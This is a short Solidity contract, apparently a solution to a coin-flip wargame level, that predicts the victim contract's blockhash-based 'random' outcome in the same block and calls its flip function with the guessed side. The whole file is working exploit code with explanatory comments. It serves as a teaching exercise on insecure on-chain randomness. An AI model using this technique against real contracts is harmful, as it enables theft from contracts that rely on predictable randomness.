/**
 *Submitted for verification at Etherscan.io on 2022-08-07
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract AttackCoinflip {
    address victim = 0xEE539d8C76766B312D2126f931131d2A5acf5Ff1;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // This is the same algorithm that is used by the victim contract
        // I am calculating the value for side before calling the victim contract.
        // This will always be correct because both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally you would use import the contract here so that you can call the
        // function directly but if you're lazy like me, you call call the function
        // like this as well. This approach is useful for when you don't have access
        // to the source code of the contract you want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}